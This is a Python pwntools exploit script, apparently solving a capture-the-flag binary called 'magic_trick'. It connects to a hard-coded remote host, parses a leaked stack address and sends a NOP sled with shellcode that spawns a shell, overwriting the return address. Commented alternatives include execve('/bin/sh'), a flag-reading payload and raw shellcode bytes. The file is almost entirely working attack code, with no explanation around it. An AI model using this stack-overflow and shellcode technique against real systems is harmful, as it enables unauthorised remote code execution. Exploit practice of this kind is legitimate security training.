'''
cyclic 1024
*RBP  0x6161616a61616169 ('iaaajaaa')
cyclic -l jaaa
36
36+4 = 40
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

#elf = ELF('./magic_trick')
#libc = ELF('./glibc/libc.so.6')

ip, port = "94.237.57.79", 53619
io = remote(ip, port)
#io = process('./magic_trick')

payload_size = 72

#debug 12345678 -> 0x363534333231

io.recvuntil('The number is ')
buf = io.recvline().decode()
address = buf[1:15]
print(address)
print(p64(int(address, 16)))

addr = p64(int(address, 16))

#shellcode = asm(shellcraft.linux.cat('flag.txt'))      #OK
shellcode = asm(shellcraft.popad())
shellcode += asm(shellcraft.sh())
#shellcode = asm(shellcraft.execve('/bin/sh'))

#http://shell-storm.org/shellcode/files/shellcode-806.html
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = b'\x90'*(payload_size - len(shellcode)) + shellcode + addr

io.sendlineafter('>>', b'y')
io.sendlineafter('>>', payload)
io.interactive()
#print(io.recvall())


'''
'''
